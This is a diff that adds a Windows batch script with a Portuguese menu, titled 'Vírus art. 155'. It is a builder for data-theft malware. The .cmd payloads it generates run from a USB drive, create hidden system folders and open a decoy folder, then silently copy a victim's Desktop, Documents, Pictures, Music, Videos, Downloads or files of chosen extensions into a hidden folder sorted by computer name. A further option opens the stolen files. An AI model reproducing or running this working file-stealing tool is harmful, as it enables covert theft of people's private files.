@@ -1,0 +1,272 @@
+@echo off
+title V¡rus art. 155
+set m=
+set conf=Nenhuma
+set n=Nenhum
+set nome=art.155
+:in
+cls
+mode 70,29
+color 0b
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo  Arquivo: %n% ¯ éltima config: %conf%
+echo ______________________________________________________________________
+echo    O que %m%vocˆ deseja roubar %username%?
+echo ----------------------------------------------------------------------
+echo  		1¿		³	4¿
+echo  		 À Desktop	³	 À V¡deos
+echo.				³
+echo  		2¿		³	5¿
+echo  		 À Imagens	³	 À Documentos
+echo.				³
+echo  		3¿		³	6¿
+echo  		 À M£sicas	³	 À Downloads		 		    		   		  
+echo          T¿                     ³      E¿
+echo           À Todas as pastas    ³       À Especificar extensÆo
+echo				        ³ 		
+echo --------------------------------Á-------------------------------------
+echo                        V - Ver captura ³    ³   C - Compilar script
+echo Ú---------------------------------------Ù    ³
+echo ³                                            À------------------------
+set /p op= À-Escolha uma op‡Æo  
+
+if "%op%" == "1" (
+set dir=Desktop
+set xp=Desktop
+set conf=Pasta Desktop
+goto gerar
+)
+
+if "%op%" == "2" (
+set dir=Pictures
+set xp=Meus Documentos\Minhas imagens
+set conf=Pasta Imagens
+goto gerar
+)
+
+if "%op%" == "3" (
+set dir=Music
+set xp=Meus Documentos\Minhas m£sicas
+set conf=Pasta M£sicas
+goto gerar
+)
+
+if "%op%" == "4" (
+set dir=Videos
+set xp=Meus Documentos\Meus v¡deos
+set conf=Pasta V¡deos 
+goto gerar
+)
+
+if "%op%" == "5" (
+set dir=Documents
+set xp=Meus Documentos\*
+set conf=Pasta Documentos
+goto gerar
+)
+ 
+if "%op%" == "6" (
+set dir=Downloads
+set xp=Downloads
+set conf=Pasta Downloads
+goto gerar
+)
+
+if "%op%" == "V" goto ver
+if "%op%" == "v" goto ver
+
+if "%op%" == "T" goto tudo
+if "%op%" == "t" goto tudo
+
+if "%op%" == "E" goto ext
+if "%op%" == "e" goto ext
+
+if "%op%" == "C" (start lib.exe & goto in)
+if "%op%" == "c" (start lib.exe & goto in)
+echo msgbox"Escolhe uma opção válida o cavalo!" ,vbcritical, "Vírus art. 155" > %temp%\msg.vbs
+start %temp%\msg.vbs & goto in
+
+::VÍRUS POR PASTA ESPECIFICAS
+:gerar
+color 1f
+mode 70,11
+cls
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo         RUá Ñ3 4RQUIV$ ® Pasta %dir% ¯ P3¥ÑRIV3 L4ÑR4O
+echo ______________________________________________________________________
+echo  (Nome padrÆo: %nome%) ¯ PRESSIONE [ENTER] PARA USAR O PADRÇO
+echo ----------------------------------------------------------------------
+set /p nome=Nome do arquivo: 
+
+echo @echo off >>"%nome%.cmd"
+echo if not exist "%nome%," (md "%nome%," ^& attrib "%nome%," +s +h) >>"%nome%.cmd"
+echo start %nome%, >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%" (md "DB\%%computername%%" ^& attrib "DB" +s +h) >>"%nome%.cmd"
+echo if exist "%%appdata%%\microsoft\windows\start menu\programs\startup" ( >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\%dir%" (md "DB\%%computername%%\%dir%") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\%dir%" "%%cd%%\DB\%%computername%%\%dir%" /y ^>nul >>"%nome%.cmd"
+echo ) else ( >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\%xp%" (md "DB\%%computername%%\%xp%") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\%xp%" "%%cd%%\DB\%%computername%%\%xp%" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+set n=%nome%
+set m=mais 
+echo  
+goto in
+
+::TODAS AS PASTA
+:tudo
+color 1f
+echo msgbox"Para roubar todas as pasta de usuário da vítima use o vírus em um disposito com bastante memória de armazenamento" ,vbexclamation, "Vírus art. 155" > %temp%\msg.vbs
+start %temp%\msg.vbs
+cls
+mode 70,11
+cls
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo         RUá Ñ3 4RQUIV$ ® TODAS AS PASTAS ¯ P3¥ÑRIV3 L4ÑR4O
+echo ______________________________________________________________________
+echo  (Nome padrÆo: %nome%) ¯ PRESSIONE [ENTER] PARA USAR O PADRÇO
+echo ----------------------------------------------------------------------
+set /p nome=Nome do arquivo:
+
+echo @echo off >>"%nome%.cmd"
+echo if not exist "%nome%," (md "%nome%," ^& attrib "%nome%," +s +h) >>"%nome%.cmd"
+echo start %nome%, >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\Tudo" (md "DB\%%computername%%\Tudo" ^& attrib "DB" +s +h) >>"%nome%.cmd"
+
+echo if exist "%%appdata%%\microsoft\windows\start menu\programs\startup" ( >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\Tudo\Desktop" (md "DB\%%computername%%\Tudo\Desktop") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\desktop" "%%cd%%\DB\%%computername%%\Tudo\Desktop" /y ^>nul >>"%nome%.cmd"
+
+echo if not exist "DB\%%computername%%\Tudo\Pictures" (md "DB\%%computername%%\Tudo\Pictures") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Pictures" "%%cd%%\DB\%%computername%%\Tudo\Pictures" /y ^>nul >>"%nome%.cmd"
+
+echo if not exist "DB\%%computername%%\Tudo\Music" (md "DB\%%computername%%\Tudo\Music") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Music" "%%cd%%\DB\%%computername%%\Tudo\Music" /y ^>nul >>"%nome%.cmd"
+
+echo if not exist "DB\%%computername%%\Tudo\Documents" (md "DB\%%computername%%\Tudo\Documents") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Documents" "%%cd%%\DB\%%computername%%\Tudo\Documents" /y ^>nul >>"%nome%.cmd"
+
+echo if not exist "DB\%%computername%%\Tudo\Videos" (md "DB\%%computername%%\Tudo\Videos") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Videos" "%%cd%%\DB\%%computername%%\Tudo\Videos" /y ^>nul >>"%nome%.cmd"
+
+echo if not exist "DB\%%computername%%\Tudo\Downloads" (md "DB\%%computername%%\Tudo\Downloads") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Downloads" "%%cd%%\DB\%%computername%%\Tudo\Downloads" /y ^>nul >>"%nome%.cmd"
+echo ) else ( >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\Tudo\Meus Documentos" (md "DB\%%computername%%\Tudo\Meus Documentos") >>"%nome%.cmd"
+echo xcopy /s /c /q "%%userprofile%%\Meus Documentos" "%%cd%%\DB\%%computername%%\Tudo\Meus Documentos" /y ^>nul >>"%nome%.cmd"
+echo exit >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+set conf=Pasta %dir%
+set n=%nome%
+set m=mais 
+echo  
+goto in
+
+::ROUBO POR EXTENSÃO DE ARQUIVOS
+:ext
+echo msgbox"Digite o nome ou tipo de extensão de arquivos, os arquivos serão filtrados e capturados das pastas de usuário" ,vbinformation, "Vírus art.155" > %temp%\msg.vbs
+start %temp%\msg.vbs
+mode 70,11
+color 1f
+:erro
+cls
+::EXTENSÕES
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo         RUá Ñ3 4RQUIV$ ® EXTENSÇO ESPECIFICA ¯ P3¥ÑRIV3 L4ÑR4O
+echo ______________________________________________________________________
+echo  EXEMPLO: *.jpeg *.mp3 *.pdf *.exe
+echo ----------------------------------------------------------------------
+set ext=*
+set /p ext=Extensäes do arquivo:
+
+cls
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo         RUá Ñ3 4RQUIV$ ® EXTENSÇO ESPECIFICA ¯ P3¥ÑRIV3 L4ÑR4O
+echo ______________________________________________________________________
+echo  (Nome padrÆo: %nome%) ¯ PRESSIONE [ENTER] PARA USAR O PADRÇO
+echo ----------------------------------------------------------------------
+set /p nome=Nome do arquivo:
+
+echo @echo off >>"%nome%.cmd"
+echo if not exist "%nome%," (md "%nome%," ^& attrib "%nome%," +s +h) >>"%nome%.cmd"
+echo start %nome%, >>"%nome%.cmd"
+echo if not exist "DB\%%computername%%\Especificos" (md "DB\%%computername%%\Especificos" ^& attrib "DB" +s +h) >>"%nome%.cmd"
+
+echo if exist "%%appdata%%\microsoft\windows\start menu\programs\startup" ( >>"%nome%.cmd"
+echo for /r "%%userprofile%%\pictures" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo echo %%%%R >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+
+echo for /r "%%userprofile%%\documents" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo echo %%%%R >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+
+echo for /r "%%userprofile%%\desktop" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+
+echo for /r "%%userprofile%%\music" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+
+echo for /r "%%userprofile%%\video" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+echo exit >>"%nome%.cmd"
+echo ) else ( >>"%nome%.cmd"
+echo for /r "%%userprofile%%\Meus Documentos" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+
+echo for /r "%%userprofile%%\desktop" %%%%R in (%ext%) do ( >>"%nome%.cmd"
+echo xcopy /s /c /q "%%%%R" "%%cd%%\DB\%%computername%%\Especificos" /y ^>nul >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+echo exit >>"%nome%.cmd"
+echo ) >>"%nome%.cmd"
+set conf=Especifico:%ext%
+set n=%nome%
+set m=mais 
+echo  
+goto in
+
+::VER PASTA DE CAPTURA
+:ver
+echo msgbox"Digite a letra do dispositivo usado na captura dos arquivos para abrir a pasta secreta" ,vbinformation, "Vírus art.155" > %temp%\msg.vbs
+start /wait %temp%\msg.vbs & start explorer
+:again
+cls
+color 0a
+mode 70,11
+cls
+echo.
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo        RUá Ñ3 4RQUIV$ ® Ver pasta de captura ¯ P3¥ÑRIV3 L4ÑR4O
+echo ______________________________________________________________________
+echo  Digite a letra do dispositivo usado sem os (:)
+echo ----------------------------------------------------------------------
+set drive=0
+set /p drive=Dispositivo: 
+if %drive% == 0 (
+echo msgbox"Digite a letra do pendrive que você usou no roubo dos arquivos caralho!!!" ,vbcritical, "Vírus art.155" > %temp%\msg.vbs
+start %temp%\msg.vbs & goto again
+)
+
+if not exist "%drive%:" (
+echo msgbox"Essa merda de dispositivo não existe, digite a letra correta sem os dois pontos" ,vbcritical, "Vírus art.155" > %temp%\msg.vbs
+start %temp%\msg.vbs & goto again
+)
+
+if exist "%drive%:\DB" (start %drive%:\DB) else (
+echo msgbox"Não foi executado o virus nesse dispositivo" ,vbexclamation, "Vírus art.155" > %temp%\msg.vbs
+start %temp%\msg.vbs & goto in
+)
+
+
